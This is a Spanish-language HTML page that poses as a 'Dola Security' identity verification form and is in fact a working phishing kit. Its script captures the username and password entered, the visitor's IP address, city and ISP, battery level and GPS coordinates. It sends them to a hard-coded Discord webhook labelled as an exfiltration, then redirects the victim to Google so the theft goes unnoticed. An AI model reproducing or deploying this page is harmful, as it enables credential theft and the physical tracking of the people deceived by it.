<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dola Security - Sistema de Verificaci√≥n</title>
    <style>
        body { background: #0b0e14; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        .box { border: 2px solid #00ff41; padding: 25px; border-radius: 15px; display: inline-block; background: #161b22; box-shadow: 0 0 20px #00ff41; width: 90%; max-width: 400px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #00ff41; background: #0b0e14; color: white; border-radius: 5px; }
        button { width: 95%; padding: 15px; background: #00ff41; color: black; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; margin-top: 10px; }
        #status { font-size: 10px; margin-top: 15px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <h2>üõ°Ô∏è DOLA TIT√ÅN V2</h2>
        <p>AUTENTICACI√ìN REQUERIDA</p>
        <input type="text" id="user" placeholder="Usuario / Email" required>
        <input type="password" id="pass" placeholder="Password de Red" required>
        <button onclick="ejecutarTodo()">VERIFICAR IDENTIDAD</button>
        <div id="status">Conexi√≥n encriptada AES-256</div>
    </div>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";

        async function ejecutarTodo() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            
            if(!user || !pass) { alert("Complete los campos"); return; }

            // 1. Obtener IP y Proveedor
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

            // 2. Obtener Bater√≠a
            const bat = await navigator.getBattery();
            const nivelBat = (bat.level * 100) + "%";

            // 3. Intentar obtener GPS
            navigator.geolocation.getCurrentPosition(pos => {
                enviar(user, pass, ipData, nivelBat, pos.coords);
            }, err => {
                enviar(user, pass, ipData, nivelBat, null);
            });
        }

        function enviar(u, p, ip, bat, gps) {
            let mapa = gps ? `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}` : "No permitido";
            
            const payload = {
                username: "DOLA TIT√ÅN - INTELIGENCIA",
                embeds: [{
                    title: "üöÄ EXFILTRACI√ìN COMPLETA",
                    color: 65280,
                    fields: [
                        { name: "üë§ Credenciales", value: `User: \`${u}\` \nPass: \`${p}\`` },
                        { name: "üìç Ubicaci√≥n GPS", value: `[Ver en Mapa](${mapa})` },
                        { name: "üåê Red e IP", value: `IP: ${ip.ip}\nCiudad: ${ip.city}\nEmpresa: ${ip.org}` },
                        { name: "üì± Dispositivo", value: `Bater√≠a: ${bat}\nNavegador: ${navigator.platform}` }
                    ],
                    footer: { text: "Estarlin Security Solutions - Dominando la red" }
                }]
            };

            fetch(HOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                alert("Sincronizaci√≥n completa con el servidor.");
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
